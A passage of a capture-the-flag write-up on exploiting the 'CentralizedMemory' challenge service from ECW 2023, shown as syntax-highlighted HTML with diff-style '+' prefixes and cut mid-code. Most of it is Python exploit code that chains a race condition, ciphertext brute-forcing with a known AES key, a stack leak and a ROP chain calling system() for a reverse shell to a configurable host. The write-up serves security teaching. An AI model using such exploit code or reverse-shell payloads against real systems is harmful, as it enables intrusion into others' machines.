+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>setup_exploitable_blocks</span>(io: tube, size_1: int, size_2: int) <span style=color:#f92672>-&gt;</span> int:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Setup the memory to trigger the confusion vulnerability
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    The first block must be a plaintext block of size &#34;size_1&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    The second block must be an encrypted block of size &#34;size_2&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    They must be adjacent, but if blocks have the same id, this is always the case
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    block_ids  <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>    exp_blocks <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Loop will we don&#39;t have exploitable conditions (explained above)</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(exp_blocks) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
+</span></span><span style=display:flex><span>        client_clear(io)
+</span></span><span style=display:flex><span>        block_ids<span style=color:#f92672>.</span>clear()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        t1 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>client_loop, args<span style=color:#f92672>=</span>(block_ids, size_1, <span style=color:#66d9ef>False</span>))
+</span></span><span style=display:flex><span>        t2 <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>client_loop, args<span style=color:#f92672>=</span>(block_ids, size_2, <span style=color:#66d9ef>True</span>))
+</span></span><span style=display:flex><span>        t1<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>        t2<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>        t1<span style=color:#f92672>.</span>join()
+</span></span><span style=display:flex><span>        t2<span style=color:#f92672>.</span>join()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Find for exploitable layout</span>
+</span></span><span style=display:flex><span>        exp_blocks <span style=color:#f92672>=</span> find_exploitable_blocks(io, block_ids, size_2)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Arbitrary choose the first block</span>
+</span></span><span style=display:flex><span>    exp_block_id <span style=color:#f92672>=</span> exp_blocks[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Free the memory. Not necessary but for cleaner memory space</span>
+</span></span><span style=display:flex><span>    [client_free(io, block_id) <span style=color:#66d9ef>for</span> block_id <span style=color:#f92672>in</span> block_ids <span style=color:#66d9ef>if</span> block_id <span style=color:#f92672>!=</span> exp_block_id]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> exp_block_id
+</span></span></code></pre></div><p>The function <code>setup_exploitable_blocks</code> returns a block ID that can trigger the bug (i.e a plaintext block followed by an encrypted block with the same ID).</p><h2 id=step-3-pivoting-to-stack-data-leak>Step 3: Pivoting to stack data leak</h2><p>In the <em>read</em> command function (3), the block data is sent to the client using <code>send(client_fd, data, dec_size)</code>. Since <code>data</code> is a stack buffer, if we can overwrite the <code>dec_size</code> field of a block, we can leak data from the stack.</p><p>This is where the bug from step 2 comes in. With this bug, we can overflow the data buffer of any block. Due to the memory layout, the data right after the overflowed buffer is the next block data.</p><p><a href=/posts/img/ecw-2023/centralizedmemory/overflow.png target=_blank><img src=/posts/img/ecw-2023/centralizedmemory/overflow.png alt=Overflow></a></p><p>We will use this overflow to overwrite the <code>dec_size</code> field of the next block. We want to set the next block size to something larger than the maximum block size allowed by the RAM server (512 bytes). This will allow us to trigger the stack leak with the read command (3).</p><p>But before doing that, two constraints must be taken into account:</p><ol><li>data overflowing the buffer is encrypted and therefore not directly controllable;</li><li>if the field <code>block_canary</code> is altered, the read function will fail, so it must remain untouched after the overflow.</li></ol><p>In order to solve <strong>constraint 1</strong>, we must brute-force the plaintext value and encrypt it until we find a suitable ciphered text that will have the targeted bytes at the right offsets. Since the AES key used for encryption is known (<code>TH3Gr3eNSh4rDk3y</code>), we can use it to brute-force cipher blocks locally. The first constraint is now solved (as long as the target bytes are not too long).</p><p>As for <strong>constraint 2</strong>, the next block canary prevents any modification of the next block data. Luckily for us, it is calculated as the following: <code>(&lt;block_id> * 0xdeadbeef) & 0xffff</code>. Since the block id (<code>&lt;block_id></code>) is known, we can calculate any block canary.</p><p>To trigger the stack leak, we will use the function below to find a cipher text with the following properties:</p><ul><li>the stack canary of the second block is preserved;</li><li>the <code>dec_size</code> field of the second block will be greater than 512 bytes (we choose 840 here, to leak enough data) but not too much to avoid reading too far (we choose 4096 bytes).</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>AES_KEY <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;TH3Gr3eNSh4rDk3y&#34;</span>
+</span></span><span style=display:flex><span>AES_IV  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_leak_payload</span>(block_id: int, small_block_size: int) <span style=color:#f92672>-&gt;</span> bytes:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Try to find an encrypted block that can overwrite the canary and the decrypted size of the adjacent block correctly
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns the data of the payload to send
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Generate the canary value using the same algorithm</span>
+</span></span><span style=display:flex><span>    block_canary <span style=color:#f92672>=</span> (block_id <span style=color:#f92672>*</span> <span style=color:#ae81ff>0xdeadbeef</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    aes_cipher <span style=color:#f92672>=</span> Cipher(algorithms<span style=color:#f92672>.</span>AES(AES_KEY), modes<span style=color:#f92672>.</span>CBC(AES_IV), backend<span style=color:#f92672>=</span>default_backend())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>        aes_encryptor <span style=color:#f92672>=</span> aes_cipher<span style=color:#f92672>.</span>encryptor()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        data   <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(small_block_size)
+</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> aes_encryptor<span style=color:#f92672>.</span>update(data <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x05</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>+</span> aes_encryptor<span style=color:#f92672>.</span>finalize()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        canary   <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>        dec_size <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Search for:</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - correct canary value</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - an overwritten &#34;dec_size&#34; &gt; 840  (to leak the stack cookie, the binary base and the libc base)</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - an overwritten &#34;dec_size&#34; &lt; 4096 (to avoid reading at non allocated memory)</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> canary <span style=color:#f92672>==</span> block_canary <span style=color:#f92672>and</span> dec_size <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>840</span> <span style=color:#f92672>and</span> dec_size <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4096</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> data
+</span></span></code></pre></div><p>Then, we send the resulting payload with the write command (4) to trigger the buffer overflow on the first block. As a result, when we try to read the second block, we will trigger the stack leak.</p><p>With the leaked data, we are now able to calculate the binary base (breaking PIE), and the libc base (breaking ASLR). We can find, for instance:</p><ul><li>the return address at offset 536, allowing us to retrieve the binary base address;</li><li>the stack cookie at offset 520, allowing us to break the stack canary protection;</li><li>a libc address at 824, allowing us to retrieve the libc base address.</li></ul><h1 id=step-4-exploiting-the-whole-program>Step 4: Exploiting the whole program</h1><p>The <em>write</em> command (4) uses <code>read(fd, stack_buffer, request.size)</code> only if <code>request.size</code> is below <code>enc_size</code> and <code>stack_buffer</code> is only a 512-byte long stack buffer. Since <code>request.size</code> is controlled, if <code>enc_size</code> can be modified to an arbitrary value, we can trigger a stack buffer overflow.</p><p>This step is very similar to step 3 as we will also exploit the overflow bug on adjacent blocks to allow writing more than the maximum authorized size (512 bytes). Same as before, we setup the memory and then find a ciphertext to trigger the overflow using this function:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>AES_KEY <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;TH3Gr3eNSh4rDk3y&#34;</span>
+</span></span><span style=display:flex><span>AES_IV  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>OFFSET_RET_ADDR <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x218</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_exploit_payload</span>(block_id: int, small_block_size: int, rop_chain_size: int) <span style=color:#f92672>-&gt;</span> bytes:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Try to find an encrypted block that can overwrite the canary and the encrypted size
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    of the adjacent block correctly
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Returns the data of the payload to send
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Generate the canary value using the same algorithm</span>
+</span></span><span style=display:flex><span>    block_canary <span style=color:#f92672>=</span> (block_id <span style=color:#f92672>*</span> <span style=color:#ae81ff>0xdeadbeef</span>) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    aes_cipher <span style=color:#f92672>=</span> Cipher(algorithms<span style=color:#f92672>.</span>AES(AES_KEY), modes<span style=color:#f92672>.</span>CBC(AES_IV), backend<span style=color:#f92672>=</span>default_backend())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>        aes_encryptor <span style=color:#f92672>=</span> aes_cipher<span style=color:#f92672>.</span>encryptor()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        data   <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>urandom(small_block_size)
+</span></span><span style=display:flex><span>        cipher <span style=color:#f92672>=</span> aes_encryptor<span style=color:#f92672>.</span>update(data <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x06</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>+</span> aes_encryptor<span style=color:#f92672>.</span>finalize()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        canary <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>        enc_size <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(cipher[small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>:small_block_size<span style=color:#f92672>+</span><span style=color:#ae81ff>6</span>], <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Search for:</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - correct canary value</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># - an overwritten &#34;enc_size&#34; large enough to overwrite return address and hold the rop chain</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> canary <span style=color:#f92672>==</span> block_canary <span style=color:#f92672>and</span> enc_size <span style=color:#f92672>&gt;</span> OFFSET_RET_ADDR <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span> <span style=color:#f92672>+</span> rop_chain_size:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> data
+</span></span></code></pre></div><p>This time we will overwrite the <code>enc_size</code> field (and <code>dec_size</code>, but that&rsquo;s not important here). The <code>enc_size</code> is used by the <em>write</em> command (4) to check if the buffer fits within the block&rsquo;s bounds.</p><p>Here, we just check that:</p><ul><li>the block canary is preserved after the overflow;</li><li>the <code>enc_size</code> field is large enough to contain our ROP chain.</li></ul><p>Then we send our payload to the <em>write</em> command (4). The payload contains:</p><ul><li>some padding data to reach the stack cookie offset;</li><li>the stack cookie (leaked in step 3);</li><li>some padding data to reach the return address;</li><li>the ROP chain for <code>system(&lt;your reverse shell here>)</code>.</li></ul><h1 id=putting-everything-together>Putting everything together</h1><p>Here is the full exploit script:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> struct
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> collections
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> typing <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.primitives.ciphers <span style=color:#f92672>import</span> Cipher, algorithms, modes
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.backends <span style=color:#f92672>import</span> default_backend
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>STATUS_SUCCESS  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000</span>
+</span></span><span style=display:flex><span>STATUS_OVERFLOW <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xC0000008</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>REQ_MALLOC <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>REQ_FREE   <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>REQ_READ   <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>REQ_WRITE  <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>
+</span></span><span style=display:flex><span>REQ_CLEAR  <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>AES_KEY <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;TH3Gr3eNSh4rDk3y&#34;</span>
+</span></span><span style=display:flex><span>AES_IV  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>BSS_SEC_OFFSET <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x5000</span>
+</span></span><span style=display:flex><span>DIFF_BIN_BASE  <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x182C</span>
+</span></span><span style=display:flex><span>DIFF_LIBC_BASE <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x11F133</span>
+</span></span><span style=display:flex><span>OFFSET_STACK_COOKIE <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x208</span>
+</span></span><span style=display:flex><span>OFFSET_RET_ADDR     <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x218</span>
+</span></span><span style=display:flex><span>OFFSET_LIBC_ADDR    <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x338</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>GADGET_WWW <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xbbc1f</span>     <span style=color:#75715e># mov qword ptr [rdi], rsi ; ret</span>
+</span></span><span style=display:flex><span>GADGET_POP_RSI <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x2601f</span> <span style=color:#75715e># pop rsi ; ret</span>
+</span></span><span style=display:flex><span>GADGET_POP_RDI <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x23b6a</span> <span style=color:#75715e># pop rdi ; ret</span>
+</span></span><span style=display:flex><span>GADGET_RET     <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x23b6b</span> <span style=color:#75715e># ret</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>##### CHANGE ME #####</span>
+</span></span><span style=display:flex><span>SERVER_ADDR <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>##### CHANGE ME #####</span>
+</span></span><span style=display:flex><span>SERVER_PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>32929</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>##### CHANGE ME #####</span>
+</span></span><span style=display:flex><span>REMOTE_SHELL_ADDR <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;localhost&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>##### CHANGE ME #####</span>
+</span></span><span style=display:flex><span>REMOTE_SHELL_PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>12155</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>update(log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;error&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_malloc</span>(io: tube, size: int, encrypted: bool) <span style=color:#f92672>-&gt;</span> int:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Send an allocation command to the server
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;IHH&#34;</span>, REQ_MALLOC, size, <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>if</span> encrypted <span style=color:#66d9ef>else</span> <span style=color:#ae81ff>0</span>))
+</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> status <span style=color:#f92672>==</span> STATUS_SUCCESS:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>SyntaxError</span>(<span style=color:#e6db74>&#34;[E] Client malloc failed with code : </span><span style=color:#e6db74>%#x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> status)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_free</span>(io: tube, block_id: int):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Send a free command to the server
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;II&#34;</span>, REQ_FREE, block_id))
+</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> status <span style=color:#f92672>!=</span> STATUS_SUCCESS:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>SyntaxError</span>(<span style=color:#e6db74>&#34;[E] Client free failed with code : </span><span style=color:#e6db74>%#x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> status)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_read</span>(io: tube, block_id: int):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Send a read command to the server
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;II&#34;</span>, REQ_READ, block_id))
+</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> status <span style=color:#f92672>==</span> STATUS_SUCCESS:
+</span></span><span style=display:flex><span>        size <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>2</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> io<span style=color:#f92672>.</span>recv(size)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>SyntaxError</span>(<span style=color:#e6db74>&#34;[E] Client read failed with code : </span><span style=color:#e6db74>%#x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> status)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_write</span>(io: tube, block_id: int, data: bytes, size: int):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Send a write command to the server
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;III&#34;</span>, REQ_WRITE, block_id, size))
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(data)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> status <span style=color:#f92672>!=</span> STATUS_SUCCESS:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>SyntaxError</span>(<span style=color:#e6db74>&#34;[E] Client write failed with code : </span><span style=color:#e6db74>%#x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> status)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_clear</span>(io: tube):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Send a clear command to the server
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#34;&lt;I&#34;</span>, REQ_CLEAR))
+</span></span><span style=display:flex><span>    status <span style=color:#f92672>=</span> int<span style=color:#f92672>.</span>from_bytes(io<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>4</span>), <span style=color:#e6db74>&#34;little&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> status <span style=color:#f92672>!=</span> STATUS_SUCCESS:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>raise</span> <span style=color:#a6e22e>SyntaxError</span>(<span style=color:#e6db74>&#34;[E] Client clear failed with code : </span><span style=color:#e6db74>%#x</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> status)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>client_loop</span>(block_ids: List[int], size: int, encrypted: bool):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    The client loop to trigger race condition with exploitable conditions
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    io <span style=color:#f92672>=</span> remote(SERVER_ADDR, SERVER_PORT, )
+</span></span><span style=display:flex><span>    block_ids <span style=color:#f92672>+=</span> [client_malloc(io, size, encrypted) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>10</span>)]
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_exploitable_blocks</span>(io: tube, block_ids: List[int], enc_blk_size: int) <span style=color:#f92672>-&gt;</span> List[int]:
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Filter block id to find duplicate block id (successfull exploitation of the race)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Then, try to find exploitable blocks by trying to write &#34;enc_blk_size&#34; bytes to
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    the first block (when two blocks with the same id exists, the first block is always selected)
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    If the write command fails with the code CODE_OVERFLOW this means that we have writen in 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    the smaller block, which is what we are looking for
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
